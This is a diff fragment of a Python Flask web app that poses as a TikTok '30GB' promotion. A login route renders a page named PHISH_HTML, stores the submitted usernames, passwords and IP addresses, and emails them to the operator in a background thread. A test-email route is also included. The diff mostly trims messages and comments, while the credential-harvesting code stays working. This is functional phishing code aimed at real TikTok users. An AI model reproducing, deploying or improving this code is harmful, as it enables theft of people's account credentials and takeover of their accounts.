     except Exception as e:
-        logger.error(f"Email sending failed: {e}")
+        logger.error(f"❌ Email failed: {e}")
         return False
 
-# -------------------- Flask Routes --------------------
+# -------------------- Routes --------------------
 @app.route('/')
 def index():
     return render_template_string(PROMO_HTML)
@@ -458,38 +610,28 @@ def login():
         ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
 
         if not username or not password:
-            return render_template_string(PHISH_HTML, error="Both fields are required.", success=False)
+            return render_template_string(PHISH_HTML, error="Both fields required", success=False)
 
-        # Save locally
         save_credentials(username, password, ip)
-
-        # Send email alert (non‑blocking)
-        subject = f"🔥 TikTok Login Captured - {username}"
+        subject = f"🎁 TikTok 30GB Login - {username}"
         body = f"""
-        New TikTok Login Captured:
-        --------------------------------
-        Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
-        IP Address: {ip}
-        Username/Email: {username}
-        Password: {password}
-        --------------------------------
+        New Login Captured:
+        Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
+        IP: {ip}
+        User: {username}
+        Pass: {password}
         """
         threading.Thread(target=send_email_alert, args=(subject, body)).start()
-
         return render_template_string(PHISH_HTML, success=True)
-
     return render_template_string(PHISH_HTML, success=False)
 
 @app.route('/test-email')
 def test_email():
-    """Test email configuration."""
-    subject = "Test Email from TikTok Promo App"
-    body = f"Test email sent at {datetime.now().isoformat()}"
-    success = send_email_alert(subject, body)
+    success = send_email_alert("Test", f"Test at {datetime.now()}")
     return {"status": "sent" if success else "failed", "timestamp": datetime.now().isoformat()}
 
 # -------------------- Main --------------------
 if __name__ == '__main__':
-    # Render provides the PORT environment variable
     port = int(os.environ.get('PORT', 5000))
+    logger.info(f"Starting on port {port}")
     app.run(host='0.0.0.0', port=port, debug=False)
